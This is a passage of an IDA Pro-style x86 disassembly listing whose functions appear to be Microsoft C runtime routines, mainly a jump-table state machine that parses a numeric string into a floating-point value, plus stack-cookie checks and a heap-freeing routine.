                mov     [esi+4], eax
                mov     eax, [ebp+var_1C]
                mov     [esi+10h], eax
                mov     eax, [ebp+var_18]
                mov     [esi+14h], eax
                pop     edi
                mov     [esi], ebx
                mov     eax, esi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_4155FC      endp

; [00000001 BYTES: COLLAPSED FUNCTION nullsub_1. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================


sub_4156A4      proc near               ; CODE XREF: sub_415704+5↓p
                mov     eax, offset sub_41C3DC
                mov     off_425DE0, eax
                mov     off_425DE4, offset sub_41BAC3
                mov     off_425DE8, offset sub_41BA77
                mov     off_425DEC, offset sub_41BAB0
                mov     off_425DF0, offset sub_41BA19
                mov     off_425DF4, eax
                mov     off_425DF8, offset sub_41C354
                mov     off_425DFC, offset sub_41BA35
                mov     off_425E00, offset sub_41B997
                mov     off_425E04, offset sub_41B924
                retn
sub_4156A4      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_415704      proc near               ; CODE XREF: sub_412E24+20↑p
                                        ; DATA XREF: .rdata:off_420528↓o

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                call    sub_4156A4
                call    sub_41C468
                cmp     [ebp+arg_0], 0
                mov     dword_42AE94, eax
                jz      short loc_415723
                call    sub_41C3FF

loc_415723:                             ; CODE XREF: sub_415704+18↑j
                fnclex
                pop     ebp
                retn
sub_415704      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_415727      proc near               ; CODE XREF: sub_4155FC+33↑p
                                        ; sub_41CF9D+39↓p ...

var_7C          = dword ptr -7Ch
var_78          = dword ptr -78h
var_74          = dword ptr -74h
var_70          = dword ptr -70h
var_6C          = dword ptr -6Ch
var_68          = dword ptr -68h
var_64          = dword ptr -64h
var_60          = dword ptr -60h
var_5C          = dword ptr -5Ch
var_58          = dword ptr -58h
var_54          = dword ptr -54h
var_50          = dword ptr -50h
var_4C          = dword ptr -4Ch
var_48          = byte ptr -48h
var_46          = dword ptr -46h
var_3C          = dword ptr -3Ch
var_38          = dword ptr -38h
var_32          = dword ptr -32h
var_2C          = dword ptr -2Ch
var_28          = dword ptr -28h
var_24          = dword ptr -24h
var_20          = byte ptr -20h
var_9           = byte ptr -9
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h
arg_14          = dword ptr  1Ch
arg_18          = dword ptr  20h
arg_1C          = dword ptr  24h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 7Ch
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_0]
                push    ebx
                xor     ebx, ebx
                push    esi
                xor     esi, esi
                mov     [ebp+var_78], eax
                mov     eax, [ebp+arg_4]
                inc     esi
                xor     ecx, ecx
                push    edi
                mov     [ebp+var_70], eax
                lea     edi, [ebp+var_20]
                mov     [ebp+var_74], ebx
                mov     [ebp+var_68], esi
                mov     [ebp+var_4C], ebx
                mov     [ebp+var_58], ebx
                mov     [ebp+var_5C], ebx
                mov     [ebp+var_60], ebx
                mov     [ebp+var_64], ebx
                mov     [ebp+var_50], ebx
                mov     [ebp+var_6C], ebx
                cmp     [ebp+arg_1C], ebx
                jnz     short loc_415791
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                xor     eax, eax
                jmp     loc_415DDF
; ---------------------------------------------------------------------------

loc_415791:                             ; CODE XREF: sub_415727+49↑j
                mov     edx, [ebp+arg_8]
                mov     [ebp+var_54], edx

loc_415797:                             ; CODE XREF: sub_415727+83↓j
                mov     al, [edx]
                cmp     al, 20h
                jz      short loc_4157A9
                cmp     al, 9
                jz      short loc_4157A9
                cmp     al, 0Ah
                jz      short loc_4157A9
                cmp     al, 0Dh
                jnz     short loc_4157AC

loc_4157A9:                             ; CODE XREF: sub_415727+74↑j
                                        ; sub_415727+78↑j ...
                inc     edx
                jmp     short loc_415797
; ---------------------------------------------------------------------------

loc_4157AC:                             ; CODE XREF: sub_415727+80↑j
                mov     bl, 30h

loc_4157AE:                             ; CODE XREF: sub_415727+A8↓j
                                        ; sub_415727+BE↓j ...
                mov     al, [edx]
                inc     edx
                cmp     ecx, 0Bh        ; switch 12 cases
                ja      loc_4159E9      ; jumptable 004157BA default case
                jmp     ds:off_415DEF[ecx*4] ; switch jump
; ---------------------------------------------------------------------------

loc_4157C1:                             ; CODE XREF: sub_415727+93↑j
                                        ; DATA XREF: .text:off_415DEF↓o
                mov     cl, al          ; jumptable 004157BA case 0
                sub     cl, 31h
                cmp     cl, 8
                ja      short loc_4157D1

loc_4157CB:                             ; CODE XREF: sub_415727+F9↓j
                                        ; sub_415727+14C↓j
                push    3

loc_4157CD:                             ; CODE XREF: sub_415727+203↓j
                                        ; sub_415727+21A↓j
                pop     ecx
                dec     edx
                jmp     short loc_4157AE
; ---------------------------------------------------------------------------

loc_4157D1:                             ; CODE XREF: sub_415727+A2↑j
                mov     ecx, [ebp+arg_1C]
                mov     ecx, [ecx]
                mov     ecx, [ecx+0BCh]
                mov     ecx, [ecx]
                cmp     al, [ecx]
                jnz     short loc_4157E7

loc_4157E2:                             ; CODE XREF: sub_415727+161↓j
                push    5

loc_4157E4:                             ; CODE XREF: sub_415727+10E↓j
                                        ; sub_415727+13A↓j ...
                pop     ecx
                jmp     short loc_4157AE
; ---------------------------------------------------------------------------

loc_4157E7:                             ; CODE XREF: sub_415727+B9↑j
                movsx   eax, al
                sub     eax, 2Bh
                jz      short loc_41580C
                dec     eax
                dec     eax
                jz      short loc_415800
                sub     eax, 3
                jnz     loc_415987

loc_4157FC:                             ; CODE XREF: sub_415727+11A↓j
                                        ; sub_415727+169↓j
                mov     ecx, esi
                jmp     short loc_4157AE
; ---------------------------------------------------------------------------

loc_415800:                             ; CODE XREF: sub_415727+CA↑j
                push    2
                pop     ecx
                mov     [ebp+var_74], 8000h
                jmp     short loc_4157AE
; ---------------------------------------------------------------------------

loc_41580C:                             ; CODE XREF: sub_415727+C6↑j
                and     [ebp+var_74], 0
                push    2
                pop     ecx
                jmp     short loc_4157AE
; ---------------------------------------------------------------------------

loc_415815:                             ; CODE XREF: sub_415727+93↑j
                                        ; DATA XREF: .text:off_415DEF↓o
                mov     cl, al          ; jumptable 004157BA case 1
                sub     cl, 31h
                mov     [ebp+var_58], esi
                cmp     cl, 8
                jbe     short loc_4157CB
                mov     ecx, [ebp+arg_1C]
                mov     ecx, [ecx]
                mov     ecx, [ecx+0BCh]
                mov     ecx, [ecx]
                cmp     al, [ecx]
                jnz     short loc_415837

loc_415833:                             ; CODE XREF: sub_415727+1A9↓j
                push    4
                jmp     short loc_4157E4
; ---------------------------------------------------------------------------

loc_415837:                             ; CODE XREF: sub_415727+10A↑j
                cmp     al, 2Bh
                jz      short loc_415863
                cmp     al, 2Dh
                jz      short loc_415863
                cmp     al, bl
                jz      short loc_4157FC

loc_415843:                             ; CODE XREF: sub_415727+1B7↓j
                cmp     al, 43h
                jle     loc_415987
                cmp     al, 45h
                jle     short loc_41585F
                cmp     al, 63h
                jle     loc_415987
                cmp     al, 65h
                jg      loc_415987

loc_41585F:                             ; CODE XREF: sub_415727+126↑j
                push    6
                jmp     short loc_4157E4
; ---------------------------------------------------------------------------

loc_415863:                             ; CODE XREF: sub_415727+112↑j
                                        ; sub_415727+116↑j ...
                dec     edx
                push    0Bh
                jmp     loc_4157E4
; ---------------------------------------------------------------------------

loc_41586B:                             ; CODE XREF: sub_415727+93↑j
                                        ; DATA XREF: .text:off_415DEF↓o
                mov     cl, al          ; jumptable 004157BA case 2
                sub     cl, 31h
                cmp     cl, 8
                jbe     loc_4157CB
                mov     ecx, [ebp+arg_1C]
                mov     ecx, [ecx]
                mov     ecx, [ecx+0BCh]
                mov     ecx, [ecx]
                cmp     al, [ecx]
                jz      loc_4157E2
                cmp     al, bl
                jz      loc_4157FC

loc_415896:                             ; CODE XREF: sub_415727+1FB↓j
                                        ; sub_415727:loc_415955↓j
                mov     edx, [ebp+var_54]
                jmp     loc_4159B2
; ---------------------------------------------------------------------------

loc_41589E:                             ; CODE XREF: sub_415727+93↑j
                                        ; DATA XREF: .text:off_415DEF↓o
                mov     [ebp+var_58], esi ; jumptable 004157BA case 3
                jmp     short loc_4158BD
; ---------------------------------------------------------------------------

loc_4158A3:                             ; CODE XREF: sub_415727+198↓j
                cmp     al, 39h
                jg      short loc_4158C1
                cmp     [ebp+var_4C], 19h
                jnb     short loc_4158B7
                inc     [ebp+var_4C]
                sub     al, bl
                mov     [edi], al
                inc     edi
                jmp     short loc_4158BA
; ---------------------------------------------------------------------------

loc_4158B7:                             ; CODE XREF: sub_415727+184↑j
                inc     [ebp+var_50]

loc_4158BA:                             ; CODE XREF: sub_415727+18E↑j
                mov     al, [edx]
                inc     edx

loc_4158BD:                             ; CODE XREF: sub_415727+17A↑j
                cmp     al, bl
                jge     short loc_4158A3

loc_4158C1:                             ; CODE XREF: sub_415727+17E↑j
                mov     ecx, [ebp+arg_1C]
                mov     ecx, [ecx]
                mov     ecx, [ecx+0BCh]
                mov     ecx, [ecx]
                cmp     al, [ecx]
                jz      loc_415833

loc_4158D6:                             ; CODE XREF: sub_415727+1D8↓j
                                        ; sub_415727+1F2↓j
                cmp     al, 2Bh
                jz      short loc_415863
                cmp     al, 2Dh
                jz      short loc_415863
                jmp     loc_415843
; ---------------------------------------------------------------------------

loc_4158E3:                             ; CODE XREF: sub_415727+93↑j
                                        ; DATA XREF: .text:off_415DEF↓o
                cmp     [ebp+var_4C], 0 ; jumptable 004157BA case 4
                mov     [ebp+var_58], esi
                mov     [ebp+var_5C], esi
                jnz     short loc_415915
                jmp     short loc_4158F7
; ---------------------------------------------------------------------------

loc_4158F1:                             ; CODE XREF: sub_415727+1D2↓j
                dec     [ebp+var_50]
                mov     al, [edx]
                inc     edx

loc_4158F7:                             ; CODE XREF: sub_415727+1C8↑j
                cmp     al, bl
                jz      short loc_4158F1
                jmp     short loc_415915
; ---------------------------------------------------------------------------

loc_4158FD:                             ; CODE XREF: sub_415727+1F0↓j
                cmp     al, 39h
                jg      short loc_4158D6
                cmp     [ebp+var_4C], 19h
                jnb     short loc_415912
                inc     [ebp+var_4C]
                sub     al, bl
                mov     [edi], al
                inc     edi
                dec     [ebp+var_50]

loc_415912:                             ; CODE XREF: sub_415727+1DE↑j
                mov     al, [edx]
                inc     edx

loc_415915:                             ; CODE XREF: sub_415727+1C6↑j
                                        ; sub_415727+1D4↑j
                cmp     al, bl
                jge     short loc_4158FD
                jmp     short loc_4158D6
; ---------------------------------------------------------------------------

loc_41591B:                             ; CODE XREF: sub_415727+93↑j
                                        ; DATA XREF: .text:off_415DEF↓o
                sub     al, bl          ; jumptable 004157BA case 5
                mov     [ebp+var_5C], esi
                cmp     al, 9
                ja      loc_415896
                push    4
                jmp     loc_4157CD
; ---------------------------------------------------------------------------

loc_41592F:                             ; CODE XREF: sub_415727+93↑j
                                        ; DATA XREF: .text:off_415DEF↓o
                lea     ecx, [edx-2]    ; jumptable 004157BA case 6
                mov     [ebp+var_54], ecx
                mov     cl, al
                sub     cl, 31h
                cmp     cl, 8
                ja      short loc_415946

loc_41593F:                             ; CODE XREF: sub_415727+25E↓j
                                        ; sub_415727+26B↓j
                push    9
                jmp     loc_4157CD
; ---------------------------------------------------------------------------

loc_415946:                             ; CODE XREF: sub_415727+216↑j
                movsx   eax, al
                sub     eax, 2Bh
                jz      short loc_41596E
                dec     eax
                dec     eax
                jz      short loc_415962
                sub     eax, 3

loc_415955:                             ; CODE XREF: sub_415727+26F↓j
                jnz     loc_415896
                push    8
                jmp     loc_4157E4
; ---------------------------------------------------------------------------

loc_415962:                             ; CODE XREF: sub_415727+229↑j
                                        ; sub_415727+287↓j
                or      [ebp+var_68], 0FFFFFFFFh
                push    7
                pop     ecx
                jmp     loc_4157AE
; ---------------------------------------------------------------------------

loc_41596E:                             ; CODE XREF: sub_415727+225↑j
                                        ; sub_415727+283↓j
                push    7
                jmp     loc_4157E4
; ---------------------------------------------------------------------------

loc_415975:                             ; CODE XREF: sub_415727+93↑j
                                        ; DATA XREF: .text:off_415DEF↓o
                mov     [ebp+var_60], esi ; jumptable 004157BA case 8
                jmp     short loc_41597D
; ---------------------------------------------------------------------------

loc_41597A:                             ; CODE XREF: sub_415727+258↓j
                mov     al, [edx]
                inc     edx

loc_41597D:                             ; CODE XREF: sub_415727+251↑j
                cmp     al, bl
                jz      short loc_41597A
                sub     al, 31h
                cmp     al, 8
                jbe     short loc_41593F

loc_415987:                             ; CODE XREF: sub_415727+CF↑j
                                        ; sub_415727+11E↑j ...
                dec     edx
                jmp     short loc_4159B2
; ---------------------------------------------------------------------------

loc_41598A:                             ; CODE XREF: sub_415727+93↑j
                                        ; DATA XREF: .text:off_415DEF↓o
                mov     cl, al          ; jumptable 004157BA case 7
                sub     cl, 31h
                cmp     cl, 8
                jbe     short loc_41593F
                cmp     al, bl
                jmp     short loc_415955
; ---------------------------------------------------------------------------

loc_415998:                             ; CODE XREF: sub_415727+93↑j
                                        ; DATA XREF: .text:off_415DEF↓o
                cmp     [ebp+arg_18], 0 ; jumptable 004157BA case 11
                jz      short loc_4159E5
                movsx   eax, al
                sub     eax, 2Bh
                lea     ecx, [edx-1]
                mov     [ebp+var_54], ecx
                jz      short loc_41596E
                dec     eax
                dec     eax
                jz      short loc_415962
                mov     edx, ecx

loc_4159B2:                             ; CODE XREF: sub_415727+172↑j
                                        ; sub_415727+261↑j ...
                cmp     [ebp+var_58], 0
                mov     eax, [ebp+var_70]
                mov     [eax], edx
                jz      loc_415D9A
                push    18h
                pop     eax
                cmp     [ebp+var_4C], eax
                jbe     short loc_4159D9
                cmp     [ebp+var_9], 5
                jl      short loc_4159D2
                inc     [ebp+var_9]

loc_4159D2:                             ; CODE XREF: sub_415727+2A6↑j
                dec     edi
                inc     [ebp+var_50]
                mov     [ebp+var_4C], eax

loc_4159D9:                             ; CODE XREF: sub_415727+2A0↑j
                cmp     [ebp+var_4C], 0
                jbe     loc_415DC1
                jmp     short loc_415A3E
; ---------------------------------------------------------------------------

loc_4159E5:                             ; CODE XREF: sub_415727+275↑j
                push    0Ah
                pop     ecx
                dec     edx

loc_4159E9:                             ; CODE XREF: sub_415727+8D↑j
                                        ; sub_415727+93↑j
                                        ; DATA XREF: ...
                cmp     ecx, 0Ah        ; jumptable 004157BA default case
                jnz     loc_4157AE
                jmp     short loc_4159B2
; ---------------------------------------------------------------------------

loc_4159F4:                             ; CODE XREF: sub_415727+93↑j
                                        ; DATA XREF: .text:off_415DEF↓o
                mov     [ebp+var_60], esi ; jumptable 004157BA case 9
                xor     ecx, ecx
                jmp     short loc_415A14
; ---------------------------------------------------------------------------

loc_4159FB:                             ; CODE XREF: sub_415727+2EF↓j
                cmp     al, 39h
                jg      short loc_415A1F
                imul    ecx, 0Ah
                movsx   esi, al
                lea     ecx, [ecx+esi-30h]
                cmp     ecx, 1450h
                jg      short loc_415A1A
                mov     al, [edx]
                inc     edx

loc_415A14:                             ; CODE XREF: sub_415727+2D2↑j
                cmp     al, bl
                jge     short loc_4159FB
                jmp     short loc_415A1F
; ---------------------------------------------------------------------------

loc_415A1A:                             ; CODE XREF: sub_415727+2E8↑j
                mov     ecx, 1451h

loc_415A1F:                             ; CODE XREF: sub_415727+2D6↑j
                                        ; sub_415727+2F1↑j
                mov     [ebp+var_64], ecx
                jmp     short loc_415A2F
; ---------------------------------------------------------------------------

loc_415A24:                             ; CODE XREF: sub_415727+30A↓j
                cmp     al, 39h
                jg      loc_415987
                mov     al, [edx]
                inc     edx

loc_415A2F:                             ; CODE XREF: sub_415727+2FB↑j
                cmp     al, bl
                jge     short loc_415A24
                jmp     loc_415987
; ---------------------------------------------------------------------------

loc_415A38:                             ; CODE XREF: sub_415727+31B↓j
                dec     [ebp+var_4C]
                inc     [ebp+var_50]

loc_415A3E:                             ; CODE XREF: sub_415727+2BC↑j
                dec     edi
                cmp     byte ptr [edi], 0
                jz      short loc_415A38
                lea     eax, [ebp+var_3C]
                push    eax
                push    [ebp+var_4C]
                lea     eax, [ebp+var_20]
                push    eax
                call    sub_41C491
                mov     eax, [ebp+var_64]
                xor     edx, edx
                add     esp, 0Ch
                cmp     [ebp+var_68], edx
                jge     short loc_415A63
                neg     eax

loc_415A63:                             ; CODE XREF: sub_415727+338↑j
                add     eax, [ebp+var_50]
                cmp     [ebp+var_60], edx
                jnz     short loc_415A6E
                add     eax, [ebp+arg_10]

loc_415A6E:                             ; CODE XREF: sub_415727+342↑j
                cmp     [ebp+var_5C], edx
                jnz     short loc_415A76
                sub     eax, [ebp+arg_14]

loc_415A76:                             ; CODE XREF: sub_415727+34A↑j
                cmp     eax, 1450h
                jg      loc_415DA3
                cmp     eax, 0FFFFEBB0h
                jl      loc_415DBA
                mov     ecx, offset unk_425F70
                sub     ecx, 60h
                mov     [ebp+var_54], eax
                cmp     eax, edx
                jz      loc_415D88
                jge     short loc_415AAE
                neg     eax
                mov     ecx, offset unk_4260D0
                mov     [ebp+var_54], eax
                sub     ecx, 60h

loc_415AAE:                             ; CODE XREF: sub_415727+378↑j
                cmp     [ebp+arg_C], edx
                jnz     short loc_415AB9
                xor     eax, eax
                mov     word ptr [ebp+var_3C], ax

loc_415AB9:                             ; CODE XREF: sub_415727+38A↑j
                cmp     [ebp+var_54], edx
                jz      loc_415D88
                jmp     short loc_415AC9
; ---------------------------------------------------------------------------

loc_415AC4:                             ; CODE XREF: sub_415727+65B↓j
                mov     ecx, [ebp+var_7C]
                xor     edx, edx

loc_415AC9:                             ; CODE XREF: sub_415727+39B↑j
                mov     eax, [ebp+var_54]
                sar     [ebp+var_54], 3
                add     ecx, 54h
                and     eax, 7
                mov     [ebp+var_7C], ecx
                cmp     eax, edx
                jz      loc_415D7E
                imul    eax, 0Ch
                add     eax, ecx
                mov     ebx, eax
                mov     eax, 8000h
                cmp     [ebx], ax
                jb      short loc_415B00
                mov     esi, ebx
                lea     edi, [ebp+var_48]
                movsd
                movsd
                movsd
                dec     [ebp+var_46]
                lea     ebx, [ebp+var_48]

loc_415B00:                             ; CODE XREF: sub_415727+3C9↑j
                movzx   ecx, word ptr [ebx+0Ah]
                xor     eax, eax
                mov     [ebp+var_50], eax
                mov     [ebp+var_2C], eax
                mov     [ebp+var_28], eax
                mov     [ebp+var_24], eax
                mov     eax, [ebp+var_32]
                mov     esi, ecx
                mov     edx, 7FFFh
                xor     esi, eax
                and     eax, edx
                and     ecx, edx
                and     esi, 8000h
                mov     edi, 7FFFh
                lea     edx, [ecx+eax]
                mov     [ebp+var_70], esi
                movzx   edx, dx
                cmp     ax, di
                jnb     loc_415D60
                cmp     cx, di
                jnb     loc_415D60
                mov     edi, 0BFFDh
                cmp     dx, di
                ja      loc_415D60
                mov     esi, 3FBFh
                cmp     dx, si
                ja      short loc_415B6D
                xor     eax, eax
                mov     [ebp+var_38], eax
                mov     [ebp+var_3C], eax
                jmp     loc_415D7B
; ---------------------------------------------------------------------------

loc_415B6D:                             ; CODE XREF: sub_415727+437↑j
                xor     esi, esi
                cmp     ax, si
                jnz     short loc_415B93
                inc     edx
                test    dword ptr [ebp-34h], 7FFFFFFFh
                jnz     short loc_415B93
                cmp     [ebp+var_38], esi
                jnz     short loc_415B93
                cmp     [ebp+var_3C], esi
                jnz     short loc_415B93
                xor     eax, eax
                mov     word ptr [ebp+var_32], ax
                jmp     loc_415D7E
; ---------------------------------------------------------------------------

loc_415B93:                             ; CODE XREF: sub_415727+44B↑j
                                        ; sub_415727+455↑j ...
                cmp     cx, si
                jnz     short loc_415BB9
                inc     edx
                test    dword ptr [ebx+8], 7FFFFFFFh
                jnz     short loc_415BB9
                cmp     [ebx+4], esi
                jnz     short loc_415BB9
                cmp     [ebx], esi
                jnz     short loc_415BB9
                mov     [ebp-34h], esi
                mov     [ebp+var_38], esi
                mov     [ebp+var_3C], esi
                jmp     loc_415D7E
; ---------------------------------------------------------------------------

loc_415BB9:                             ; CODE XREF: sub_415727+46F↑j
                                        ; sub_415727+479↑j ...
                mov     [ebp+var_68], esi
                lea     edi, [ebp+var_28]
                mov     [ebp+var_58], 5

loc_415BC6:                             ; CODE XREF: sub_415727+50C↓j
                mov     eax, [ebp+var_68]
                mov     ecx, [ebp+var_58]
                add     eax, eax
                mov     [ebp+var_64], ecx
                test    ecx, ecx
                jle     short loc_415C27
                lea     eax, [ebp+eax+var_3C]
                mov     [ebp+var_5C], eax
                lea     eax, [ebx+8]
                mov     [ebp+var_60], eax

loc_415BE2:                             ; CODE XREF: sub_415727+4FE↓j
                mov     eax, [ebp+var_60]
                mov     ecx, [ebp+var_5C]
                movzx   ecx, word ptr [ecx]
                movzx   eax, word ptr [eax]
                and     [ebp+var_4C], 0
                imul    eax, ecx
                mov     ecx, [edi-4]
                lea     esi, [ecx+eax]
                cmp     esi, ecx
                jb      short loc_415C03
                cmp     esi, eax
                jnb     short loc_415C0A

loc_415C03:                             ; CODE XREF: sub_415727+4D6↑j
                mov     [ebp+var_4C], 1

loc_415C0A:                             ; CODE XREF: sub_415727+4DA↑j
                cmp     [ebp+var_4C], 0
                mov     [edi-4], esi
                jz      short loc_415C16
                inc     word ptr [edi]

loc_415C16:                             ; CODE XREF: sub_415727+4EA↑j
                add     [ebp+var_5C], 2
                sub     [ebp+var_60], 2
                dec     [ebp+var_64]
                cmp     [ebp+var_64], 0
                jg      short loc_415BE2

loc_415C27:                             ; CODE XREF: sub_415727+4AC↑j
                inc     edi
                inc     edi
                inc     [ebp+var_68]
                dec     [ebp+var_58]
                cmp     [ebp+var_58], 0
                jg      short loc_415BC6
                add     edx, 0C002h
                test    dx, dx
                jle     short loc_415C77

loc_415C40:                             ; CODE XREF: sub_415727+549↓j
                mov     edi, [ebp+var_24]
                test    edi, edi
                js      short loc_415C72
                mov     esi, [ebp+var_28]
                mov     eax, [ebp+var_2C]
                shl     [ebp+var_2C], 1
                shr     eax, 1Fh
                mov     ecx, esi
                add     esi, esi
                or      esi, eax
                shr     ecx, 1Fh
                lea     eax, [edi+edi]
                or      eax, ecx
                add     edx, 0FFFFh
                mov     [ebp+var_28], esi
                mov     [ebp+var_24], eax
                test    dx, dx
                jg      short loc_415C40

loc_415C72:                             ; CODE XREF: sub_415727+51E↑j
                test    dx, dx
                jg      short loc_415CC4

loc_415C77:                             ; CODE XREF: sub_415727+517↑j
                add     edx, 0FFFFh
                test    dx, dx
                jge     short loc_415CC4
                mov     eax, edx
                neg     eax
                movzx   esi, ax
                add     edx, esi

loc_415C8B:                             ; CODE XREF: sub_415727+591↓j
                test    byte ptr [ebp+var_2C], 1
                jz      short loc_415C94
                inc     [ebp+var_50]

loc_415C94:                             ; CODE XREF: sub_415727+568↑j
                mov     eax, [ebp+var_24]
                mov     edi, [ebp+var_28]
                mov     ecx, [ebp+var_28]
                shr     [ebp+var_24], 1
                shl     eax, 1Fh
                shr     edi, 1
                or      edi, eax
                mov     eax, [ebp+var_2C]
                shl     ecx, 1Fh
                shr     eax, 1
                or      eax, ecx
                dec     esi
                mov     [ebp+var_28], edi
                mov     [ebp+var_2C], eax
                jnz     short loc_415C8B
                cmp     [ebp+var_50], esi
                jz      short loc_415CC4
                or      word ptr [ebp+var_2C], 1

loc_415CC4:                             ; CODE XREF: sub_415727+54E↑j
                                        ; sub_415727+559↑j ...
                mov     eax, 8000h
                mov     ecx, eax
                cmp     word ptr [ebp+var_2C], cx
                ja      short loc_415CE2
                mov     ecx, [ebp+var_2C]
                and     ecx, 1FFFFh
                cmp     ecx, 18000h
                jnz     short loc_415D16

loc_415CE2:                             ; CODE XREF: sub_415727+5A8↑j
                cmp     [ebp+var_2C+2], 0FFFFFFFFh
                jnz     short loc_415D13
                and     [ebp+var_2C+2], 0
                cmp     [ebp+var_28+2], 0FFFFFFFFh
                jnz     short loc_415D0E
                and     [ebp+var_28+2], 0
                mov     ecx, 0FFFFh
                cmp     word ptr [ebp+var_24+2], cx
                jnz     short loc_415D08
                mov     word ptr [ebp+var_24+2], ax
                inc     edx
                jmp     short loc_415D16
; ---------------------------------------------------------------------------

loc_415D08:                             ; CODE XREF: sub_415727+5D8↑j
                inc     word ptr [ebp+var_24+2]
                jmp     short loc_415D16
; ---------------------------------------------------------------------------

loc_415D0E:                             ; CODE XREF: sub_415727+5C9↑j
                inc     [ebp+var_28+2]
                jmp     short loc_415D16
; ---------------------------------------------------------------------------

loc_415D13:                             ; CODE XREF: sub_415727+5BF↑j
                inc     [ebp+var_2C+2]

loc_415D16:                             ; CODE XREF: sub_415727+5B9↑j
                                        ; sub_415727+5DF↑j ...
                mov     eax, 7FFFh
                cmp     dx, ax
                jb      short loc_415D43
                xor     eax, eax
                xor     ecx, ecx
                cmp     word ptr [ebp+var_70], ax
                mov     [ebp+var_38], eax
                setz    cl
                mov     [ebp+var_3C], eax
                dec     ecx
                and     ecx, 80000000h
                add     ecx, 7FFF8000h
                mov     [ebp-34h], ecx
                jmp     short loc_415D7E
; ---------------------------------------------------------------------------

loc_415D43:                             ; CODE XREF: sub_415727+5F7↑j
                mov     ax, word ptr [ebp+var_2C+2]
                or      edx, [ebp+var_70]
                mov     word ptr [ebp+var_3C], ax
                mov     eax, [ebp+var_28]
                mov     [ebp+var_3C+2], eax
                mov     eax, [ebp+var_24]
                mov     [ebp+var_38+2], eax
                mov     word ptr [ebp+var_32], dx
                jmp     short loc_415D7E
; ---------------------------------------------------------------------------

loc_415D60:                             ; CODE XREF: sub_415727+412↑j
                                        ; sub_415727+41B↑j ...
                xor     eax, eax
                test    si, si
                setz    al
                and     [ebp+var_38], 0
                dec     eax
                and     eax, 80000000h
                add     eax, 7FFF8000h
                and     [ebp+var_3C], 0

loc_415D7B:                             ; CODE XREF: sub_415727+441↑j
                mov     [ebp-34h], eax

loc_415D7E:                             ; CODE XREF: sub_415727+3B4↑j
                                        ; sub_415727+467↑j ...
                cmp     [ebp+var_54], 0
                jnz     loc_415AC4

loc_415D88:                             ; CODE XREF: sub_415727+372↑j
                                        ; sub_415727+395↑j
                mov     eax, [ebp-34h]
                movzx   ecx, word ptr [ebp+var_3C]
                mov     esi, [ebp+var_3C+2]
                mov     edx, [ebp+var_38+2]
                shr     eax, 10h
                jmp     short loc_415DC9
; ---------------------------------------------------------------------------

loc_415D9A:                             ; CODE XREF: sub_415727+294↑j
                mov     [ebp+var_6C], 4
                jmp     short loc_415DC1
; ---------------------------------------------------------------------------

loc_415DA3:                             ; CODE XREF: sub_415727+354↑j
                xor     esi, esi
                mov     eax, 7FFFh
                mov     edx, 80000000h
                xor     ecx, ecx
                mov     [ebp+var_6C], 2
                jmp     short loc_415DC9
; ---------------------------------------------------------------------------

loc_415DBA:                             ; CODE XREF: sub_415727+35F↑j
                mov     [ebp+var_6C], 1

loc_415DC1:                             ; CODE XREF: sub_415727+2B6↑j
                                        ; sub_415727+67A↑j
                xor     ecx, ecx
                xor     eax, eax
                xor     edx, edx
                xor     esi, esi

loc_415DC9:                             ; CODE XREF: sub_415727+671↑j
                                        ; sub_415727+691↑j
                mov     edi, [ebp+var_78]
                or      eax, [ebp+var_74]
                mov     [edi], cx
                mov     [edi+0Ah], ax
                mov     eax, [ebp+var_6C]
                mov     [edi+2], esi
                mov     [edi+6], edx

loc_415DDF:                             ; CODE XREF: sub_415727+65↑j
                mov     ecx, [ebp+var_4]
                pop     edi
                pop     esi
                xor     ecx, ebp
                pop     ebx
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_415727      endp

; ---------------------------------------------------------------------------
                db 90h
off_415DEF      dd offset loc_4157C1    ; DATA XREF: sub_415727+93↑r
                dd offset loc_415815    ; jump table for switch statement
                dd offset loc_41586B
                dd offset loc_41589E
                dd offset loc_4158E3
                dd offset loc_41591B
                dd offset loc_41592F
                dd offset loc_41598A
                dd offset loc_415975
                dd offset loc_4159F4
                dd offset loc_4159E9
                dd offset loc_415998

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_415E1F      proc near               ; CODE XREF: sub_40F79F+9↑p

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                push    0Ch
                push    offset stru_422F60
                call    __SEH_prolog4
                push    0Eh
                call    sub_416913
                pop     ecx
                and     [ebp+ms_exc.registration.TryLevel], 0
                mov     esi, [ebp+arg_0]
                mov     ecx, [esi+4]
                test    ecx, ecx
                jz      short loc_415E70
                mov     eax, dword_42AE9C
                mov     edx, offset unk_42AE98

loc_415E4B:                             ; CODE XREF: sub_415E1F+65↓j
                mov     [ebp+var_1C], eax
                test    eax, eax
                jz      short loc_415E63
                cmp     [eax], ecx
                jnz     short loc_415E82
                mov     ecx, [eax+4]
                mov     [edx+4], ecx
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_415E63:                             ; CODE XREF: sub_415E1F+31↑j
                push    dword ptr [esi+4] ; lpMem
                call    sub_40FD55
                pop     ecx
                and     dword ptr [esi+4], 0

loc_415E70:                             ; CODE XREF: sub_415E1F+20↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_415E86
; ---------------------------------------------------------------------------

loc_415E7C:                             ; CODE XREF: sub_415E1F+6F↓j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_415E82:                             ; CODE XREF: sub_415E1F+35↑j
                mov     edx, eax
                jmp     short loc_415E4B
; ---------------------------------------------------------------------------

